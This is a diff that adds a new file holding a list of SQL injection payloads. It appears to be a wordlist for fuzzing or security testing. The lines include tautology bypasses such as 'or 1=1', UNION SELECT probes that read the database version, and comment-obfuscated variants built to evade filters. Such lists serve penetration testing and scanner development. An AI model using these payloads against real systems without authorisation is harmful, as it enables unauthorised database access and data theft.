@@ -1,0 +1,15 @@
+1 or 1=1
+aaaa' or true #
+aaaa' union select 1 #
+1' or 1=1 --
+1" or 1=1 --
+1'  Or true
+1'  ||1
+1'  ||true
+' or 1=1 limit 1 -- -
+' or 'x'='x
+-1'<@=1 or {a 1}=1 OR '
+-1' AND 2<@ UNION/*!SELECT*/1, version()'
+-1'<@=1 OR {x (select 1)}='1
+1'/*comment*/or/**/1=1/**/--
+a'+(SELECT 3)+'
